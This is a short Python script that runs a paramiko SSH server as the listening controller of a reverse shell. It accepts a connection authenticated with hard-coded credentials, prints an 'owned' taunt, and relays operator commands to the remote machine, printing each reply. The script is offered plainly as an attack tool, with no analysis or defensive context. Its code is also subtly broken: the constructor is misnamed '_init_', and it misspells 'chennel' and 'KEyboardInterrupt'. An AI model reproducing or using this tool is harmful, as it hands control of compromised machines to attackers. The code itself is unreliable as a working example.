import socket
import paramiko
import threading
import sys
#using paramiko demo file key
host_key=paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event=threading.Event()
    def check_channel_request(self,kind,chanid):
       if kind=="session":
           return paramiko.OPEN_SUCCEEDED
       return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self,username,password):
        if(username=='d3ad_r0ach')and(password=='r0ach_N3v4r_di3z'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
#server=sys.argv[1]
#ssh_port=int(sys.argv[2])
server="enter your ip"
ssh_port=22
try :
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind((server,ssh_port))
    s.listen(10)
    print("de4dly_d0ra :>> started listening for connections ")
    client,addr=s.accept()
except Exception as e:
   print("listen failed : ",e)
   sys.exit(1)
print("connected sucessfully ..<->")
try :
    r0ach_session=paramiko.Transport(client)
    r0ach_session.add_server_key(host_key)
    server=Server()
    try:
        r0ach_session.start_server(server=server)
    except paramiko.SSHException as x:
        print('SSH fialed..<s3d> Error :',x)
    channel=r0ach_session.accept(20)
    print("Authenticated..")
    print(channel.recv(1024))
    channel.send("you r owned by de4dly_d0ra ..")
    while True:
      try:
          command=input("enter_command :>>")
          if command!='exit':
            channel.send(command)
            reply=channel.recv(1024)
            rep=reply.decode()
            print(rep)
          else:
            chennel.send('exit')
            print("shuting down de4dly_d0ra..")
            r0ach_session.close()
            raise Exception('exit')
      except KEyboardInterrupt:
           r0ach_session.close()
except Exception as e:
    print("Error : ",e)
    try:
        r0ach_session.close()
    except:
        pass
    sys.exit(1)
